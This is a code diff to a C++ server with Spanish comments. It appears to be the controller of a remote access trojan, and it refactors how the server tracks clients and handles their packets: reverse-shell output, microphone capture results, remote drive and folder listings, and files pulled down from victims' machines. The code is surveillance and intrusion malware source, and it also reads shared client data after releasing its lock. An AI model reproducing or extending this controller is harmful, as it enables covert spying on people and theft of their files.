@@ -232,6 +232,8 @@ void Servidor::m_Escucha(){
     timeout.tv_usec = 0;
     fd_set fdMaster;
     FD_ZERO(&fdMaster);
+
+    char cBuffer[1024 * 100]; //100 KB
     
     FD_SET(this->sckSocket, &fdMaster);
     
@@ -268,13 +270,13 @@ void Servidor::m_Escucha(){
 
                 //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                 std::unique_lock<std::mutex> lock(vector_mutex);
-                this->vc_Clientes.push_back(structNuevoCliente);
+                this->um_Clientes.insert({ sckNuevoCliente._sckSocket, structNuevoCliente });
+                this->vc_Clientes.push_back(structNuevoCliente); //----
                 lock.unlock();
                 
                 
             } else {
                 //Datos de algun cliente :v
-                char cBuffer[4096];
                 ZeroMemory(cBuffer, sizeof(cBuffer));
                 
                 int iRecibido = this->cRecv(iSock, cBuffer, sizeof(cBuffer), 0, false);
@@ -302,7 +304,7 @@ void Servidor::m_Escucha(){
                     FD_CLR(iSock, &fdMaster);
                 } else {
                     
-                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 100); //maximo 100 por ahora, pero se deberia de incrementar en un futuro
+                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 1);
 
                     if (vcDatos.size() == 0) {
                         std::cout << "No su pudo procesar :<<< " << cBuffer << std::endl;
@@ -311,47 +313,58 @@ void Servidor::m_Escucha(){
 
                     std::string strTempID = "";
                     std::unique_lock<std::mutex> lock(vector_mutex);
-                    for (auto vcCli : this->vc_Clientes) {
-                        if (vcCli._sckCliente == iSock) {
-                            strTempID = vcCli._id;
-                            break;
-                        }
+
+                    auto cliIT = this->um_Clientes.find(iSock);
+                    if (cliIT != this->um_Clientes.end()) {
+                        strTempID = cliIT->second._id;
+                    }else {
+                        std::cout << "[X] No se pudo encontrar cliente" << std::endl;
+                        lock.unlock();
+                        continue;
                     }
                     lock.unlock();
 
-
-                    if(vcDatos[0] == "01") { //Paquete inicial user,so,cpu
-                        struct Cliente structTmp;
+                    //Prioridad descarga de archivos
+                    if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
+                        vcDatos = strSplit(std::string(cBuffer), '\\', 2);
+                        // CMD + 2 slashs /  +len del id
+                        int iHeader = 5 + vcDatos[1].size();
+                        char* cBytes = cBuffer + iHeader;
                         
                         std::unique_lock<std::mutex> lock(vector_mutex);
-                        for (auto vcCli = this->vc_Clientes.begin(); vcCli != this->vc_Clientes.end(); vcCli++) {
-                            if (vcCli->_sckCliente == iSock) {
-                                structTmp._strSo = vcCli->_strSo = vcDatos[1];
-                                structTmp._strUser = vcCli->_strUser = vcDatos[2];
-                                structTmp._strCpu = vcCli->_strCpu = vcDatos[3];
-                                structTmp._id = vcCli->_id;
-                                structTmp._strIp = vcCli->_strIp;
-                                break;
-                            }
+                        
+                        auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
+                        if (archivoIter != cliIT->second.um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
+                            fwrite(cBytes, sizeof(char), iRecibido - iHeader, archivoIter->second.iFP);
                         }
+                        
                         lock.unlock();
+                        continue;
+                    }
+
+                    //Temporary fix, cambiarlo despues dependiendo el comando
+                    vcDatos = strSplit(std::string(cBuffer), '\\', 4);
+
+                    //Paquete inicial user,so,cpu
+                    if(vcDatos[0] == "01") { 
+                        struct Cliente structTmp;
+                        
+                        structTmp._strSo = cliIT->second._strSo = vcDatos[1];
+                        structTmp._strUser = cliIT->second._strUser = vcDatos[2];
+                        structTmp._strCpu = cliIT->second._strCpu = vcDatos[3];
+                        structTmp._id = cliIT->second._id;
+                        structTmp._strIp = cliIT->second._strIp;
                         
                         std::unique_lock<std::mutex> lock2(this->count_mutex);
                         this->m_InsertarCliente(structTmp);
                         this->iCount++;
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::PONG)) {//Pong
                         std::cout << "PONG de" << iSock << std::endl;
-                        
-                        std::unique_lock<std::mutex> lock(vector_mutex);
-                        for (auto vcCli = this->vc_Clientes.begin(); vcCli != this->vc_Clientes.end(); vcCli++) {
-                            if (vcCli->_sckCliente == iSock) {
-                                vcCli->_ttUltimaVez = time(0);
-                                break;
-                            }
-                        }
-                        lock.unlock();
+                        cliIT->second._ttUltimaVez = time(0);
+                        continue;
                     }
 
                     if (vcDatos[0] == "03") { //CUSTOM_TEST
@@ -367,21 +380,13 @@ void Servidor::m_Escucha(){
                         } else {
                             std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                         }
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { //Termino la shell
-                        std::string strTempID = "";
-                        std::unique_lock<std::mutex> lock(vector_mutex);
-                        for(auto vcCli = this->vc_Clientes.begin(); vcCli != this->vc_Clientes.end(); vcCli++){
-                            if (vcCli->_sckCliente == iSock) {
-                                strTempID = vcCli->_id;
-                                vcCli->_isRunningShell = false;
-                                break;
-                            }
-                        }
-                        lock.unlock();
-
-                        isEscribirSalidaShell(strTempID, vcDatos[1]);
+                        cliIT->second._isRunningShell = false;
+                        isEscribirSalidaShell(cliIT->second._id, vcDatos[1]);
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
@@ -391,8 +396,8 @@ void Servidor::m_Escucha(){
                         }
                         strOutJoined = strOutJoined.substr(0, strOutJoined.size() - 1);
 
-                        isEscribirSalidaShell(strTempID, strOutJoined);
-                        
+                        isEscribirSalidaShell(cliIT->second._id, strOutJoined);
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
@@ -416,6 +421,7 @@ void Servidor::m_Escucha(){
                         else {
                             std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                         }
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
@@ -441,6 +447,7 @@ void Servidor::m_Escucha(){
                                 std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                             }
                         }
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
@@ -473,69 +480,32 @@ void Servidor::m_Escucha(){
                         else {
                             std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                         }
-
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
                         //Tamaño del archivo recibido
                         u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
 
-                        std::unique_lock<std::mutex> lock(vector_mutex);
-                        for (auto it = this->vc_Clientes.begin(); it != this->vc_Clientes.end(); it++) {
-                            if(it->_id == strTempID) {
-                                for (auto it2 = it->vc_Archivos_Descarga.begin(); it2 != it->vc_Archivos_Descarga.end(); it2++) {
-                                    if (it2->cID == vcDatos[1]) {
-                                        it2->uTamarchivo = uTamArchivo;
-                                        break;
-                                    }
-                                }
-                                break;
-                            }
+                        
+                        auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
+                        if (archivoIter != cliIT->second.um_Archivos_Descarga2.end()) {
+                            archivoIter->second.uTamarchivo = uTamArchivo;
                         }
-                        lock.unlock();
-
+                        
                         std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
-                    }
-
-                    if(vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)){
-                        // CMD + 2 slashs /  +len del id
-                        int iHeader = 5 + strnlen(vcDatos[1].c_str(), 5);
-                        char* cBytes = cBuffer + iHeader;
-                        std::unique_lock<std::mutex> lock(vector_mutex);
-                        for (auto it = this->vc_Clientes.begin(); it != this->vc_Clientes.end(); it++) {
-                            if (it->_id == strTempID) {
-                                for (auto it2 = it->vc_Archivos_Descarga.begin(); it2 != it->vc_Archivos_Descarga.end(); it2++) {
-                                    if (it2->cID == vcDatos[1]) {
-                                        if (it2->iFP != nullptr) {
-                                            fwrite(cBytes, sizeof(char), iRecibido - iHeader, it2->iFP);
-                                            //it2->stArchivo.write(cBytes, iRecibido - iHeader);
-                                        }
-                                        break;
-                                    }
-                                }
-                                break;
-                            }
-                        }
-                        lock.unlock();
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
-                        std::unique_lock<std::mutex> lock(vector_mutex);
-                        for (auto it = this->vc_Clientes.begin(); it != this->vc_Clientes.end(); it++) {
-                            if (it->_id == strTempID) {
-                                for (auto it2 = it->vc_Archivos_Descarga.begin(); it2 != it->vc_Archivos_Descarga.end(); it2++) {
-                                    if (it2->cID == vcDatos[1]) {
-                                        if (it2->iFP != nullptr) {
-                                            fclose(it2->iFP);
-                                        }
-                                        break;
-                                    }
-                                }
-                                break;
+                        auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
+                        if (archivoIter != cliIT->second.um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
+                            if (archivoIter->second.iFP != nullptr) {
+                                fclose(archivoIter->second.iFP);
                             }
                         }
-                        lock.unlock();
                         std::cout << "[!] Descarga completa" << std::endl;
+                        continue;
                     }
 
                     if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
@@ -557,6 +527,7 @@ void Servidor::m_Escucha(){
                         }else {
                             std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                         }
+                        continue;
                     }
 
                     if (vcDatos[0] == "LMIC") {
@@ -570,6 +541,7 @@ void Servidor::m_Escucha(){
                         }else {
                             std::cout << "Paquete muy pequeño\n";
                         }
+                        continue;
                     }
                 }
             }
